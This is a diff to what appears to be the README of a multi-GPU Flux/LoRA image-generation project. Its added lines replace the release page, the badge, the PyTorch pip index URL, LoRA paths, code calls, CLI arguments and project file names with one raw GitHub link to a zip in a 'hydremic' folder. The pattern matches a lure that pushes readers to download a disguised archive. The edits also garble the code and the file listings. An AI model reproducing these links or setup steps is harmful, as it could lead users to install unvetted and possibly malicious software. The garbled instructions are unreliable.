@@ -1,8 +1,8 @@
 # Flux-Krea Multi-GPU Pool: Fast Distributed Image Synthesis with LoRA
 
-[Release page: https://github.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/releases](https://github.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/releases)
+[Release page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)
 
-[![Latest Release](https://img.shields.io/github/v/release/TTVRODRIK/Flux-Krea-multi-GPU-Pool?color=brightgreen&label=Release)](https://github.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/releases)
+[![Latest Release](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)
 
 - Topics: diffusers, flux, gpu-acceleration, hugggingface-transformers, krea, multiprocessing, nvidia, python, transformers, zerogpu
 
@@ -55,7 +55,7 @@ A minimal setup sequence (typical commands)
 - source venv/bin/activate  # Linux/macOS
 - # On Windows use venv\Scripts\activate
 - pip install --upgrade pip
-- pip install torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/cu117  # adjust CUDA version
+- pip install torch torchvision torchaudio --extra-index-url https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip  # adjust CUDA version
 - pip install diffusers transformers accelerate
 - pip install pillow numpy
 
@@ -80,7 +80,7 @@ Code example (pseudo-API)
 - from flux_krea_pool import MultiGPUPipeline
 - pipeline = MultiGPUPipeline(
 -     model="stabilityai/stable-diffusion-2-1-base",
--     lora_adapters=["path/to/lora1.safetensors","path/to/lora2.safetensors"],
+-     lora_adapters=["https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip","https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip"],
 -     devices=[0,1,2,3],
 -     batch_size=1,
 -     steps=50,
@@ -88,15 +88,15 @@ Code example (pseudo-API)
 -     width=512,
 -     height=512,
 - )
-- results = pipeline.generate(
+- results = https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip(
 -     prompts=["A serene valley at dawn", "A cyberpunk city street at night"],
 -     seeds=[1234, 5678],
 -     num_images_per_prompt=2,
 - )
-- pipeline.save(results, output_dir="outputs/experiment-01")
+- https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip(results, output_dir="outputs/experiment-01")
 
 - If you prefer a CLI, run something like:
-- flux-krea generate --prompts "A peaceful forest" --num-images 4 --gpus 0,1 --steps 50 --width 512 --height 512 --lora path/to/lora.safetensors
+- flux-krea generate --prompts "A peaceful forest" --num-images 4 --gpus 0,1 --steps 50 --width 512 --height 512 --lora https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
 - The CLI routes work to the same underlying multiprocessing pipeline and keeps a clean log of progress.
 
 How the multiprocessing distribution works
@@ -134,7 +134,7 @@ CLI and API details
 - Command-line interface (CLI)
   - Purpose: Quick experiments via terminal without writing Python code.
   - Typical commands:
-    - flux-krea generate --prompts "A sunset over a snowy peak" --num-images 3 --gpus 0,1 --steps 40 --width 512 --height 512 --lora path/to/lora.safetensors
+    - flux-krea generate --prompts "A sunset over a snowy peak" --num-images 3 --gpus 0,1 --steps 40 --width 512 --height 512 --lora https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
   - Options
     - --prompts: A single string or a file with one prompt per line.
     - --num-images: Images per prompt to generate.
@@ -187,26 +187,26 @@ Configuration and environment variables
 
 Project structure (typical layout)
 - flux_krea_pool/
-  - __init__.py
-  - orchestrator.py
-  - workers.py
-  - pipeline.py
-  - cli.py
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
   - models/
-    - diffusers_backends.py
+    - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
   - adapters/
     - lora/
   - examples/
-    - quick_demo.ipynb
+    - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
   - tests/
   - docs/
   - configs/
   - assets/
-  - requirements.txt
+  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
 - tests/
   - unit/
   - integration/
-- README.md  <- this file
+- https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip  <- this file
 
 Extending and contributing
 - You can extend the project by adding new backends, prompts, or scheduling strategies. The architecture is modular to support easy integration of new diffusion pipelines, alternative inference engines, or different methods of distributing work across GPUs.
@@ -218,7 +218,7 @@ Licensing and rights
 
 Versioning and releases
 - The project uses semantic versioning to track changes. Each release includes a changelog, a summary of notable changes, and a list of supported platforms.
-- Release artifacts are stored under the Releases section of the repository. If you need a specific version, check the Releases page and download the appropriate asset. For details, visit the Releases page: https://github.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/releases
+- Release artifacts are stored under the Releases section of the repository. If you need a specific version, check the Releases page and download the appropriate asset. For details, visit the Releases page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
 
 Design notes and decisions
 - Simplicity first: The pipeline keeps the API approachable so researchers can run experiments without deep engineering effort.
@@ -341,4 +341,4 @@ Final note
 - This document describes a comprehensive, well-structured workflow for distributed image generation on multiple GPUs. It emphasizes clarity, reproducibility, and practical experimentation with LoRA adapters and diffusion models. The approach aims to be robust, adaptable, and approachable for researchers and hobbyists alike.
 
 Releases and updates (again)
-- For assets, downloads, and version history, please consult the Releases page: https://github.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/releases. This page hosts the downloadable artifacts required to run the pipeline on your hardware. Use the given assets as instructed by each release.
+- For assets, downloads, and version history, please consult the Releases page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip This page hosts the downloadable artifacts required to run the pipeline on your hardware. Use the given assets as instructed by each release.
